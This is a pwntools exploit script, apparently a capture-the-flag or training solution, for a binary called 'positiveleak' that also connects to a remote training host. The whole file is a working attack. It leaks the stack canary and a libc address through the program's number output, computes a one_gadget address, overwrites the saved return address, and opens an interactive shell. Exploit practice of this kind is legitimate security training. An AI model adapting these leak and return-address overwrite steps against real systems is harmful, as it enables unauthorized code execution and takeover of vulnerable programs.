from pwn import *

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./positiveleak")
        gdb.attach(p, """
            b *add_numbers+62
            b *add_numbers+147
            b *add_numbers+269
            b *add_numbers+404
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./positiveleak"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 3003)
else:
    p = process("./positiveleak")


def add_numbers(size, first_value, values):
    p.recvuntil(b"> ")
    p.sendline(p32(0))
    p.recvuntil(b"How many would you add?> ")
    p.sendline(b'6')
    print(p.recvuntil(b"#> "))
    p.sendline(b"%d" % first_value)
    for v in values:
        p.recvuntil(b"#> ")
        p.sendline(b"%d" % v)

def leak_from_print(pos):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    for _ in range(pos-1):
        p.recvuntil(b"\n")
    leak = int(p.recvuntil(b"\n")[:-1])
    return leak

def stack_offset(size):
    return 16*((size*4 + 23) // 16)

LIBC = ELF("./libc-2.35.so")

# Leak canary and libc
add_numbers(6, 0, [0,0,0, 0, 73014444031, 0]) # 73014444031 = 0x10_ffffffff
leak_canary = leak_from_print(10)
leak_libc = leak_from_print(14)
sleep(0.1)

print("[!] canary: %#x" % leak_canary)
print("[!] leak: %#x" % leak_libc)
LIBC.address = leak_libc - 0x29D90
print("[!] libc: %#x" % LIBC.address)
one_gadget_offset = 0x50a37 #other gadgets 0xebcf1 0xebcf5 0xebcf8 0xebd52 0xebdaf 0xebdb3
LIBC.one_gadget = LIBC.address + one_gadget_offset
print("[!] one_gadget: %#x" % LIBC.one_gadget)

# Second Stage
input('Start Second Part')
stack_num = 50
stack_dist = int(stack_offset(stack_num) / 8) + 1

p.recvuntil(b"> ")
p.sendline(b"0")
p.recvuntil(b"> ")
p.sendline(b"%d" % stack_num)

for i in range(0, stack_dist):
    p.recvuntil(b"> ")
    p.sendline(b"0")

counter = int(hex(stack_dist + 5) + "00000000", 16)

p.recvuntil(b"> ")
p.sendline(b"%d" % counter)

p.recvuntil(b"> ")
p.sendline(b"%d" % LIBC.one_gadget)

for i in range(0, 9):
    p.recvuntil(b"> ")
    p.sendline(b"0")

p.recvuntil(b"> ")
p.sendline(b"-1")

p.interactive()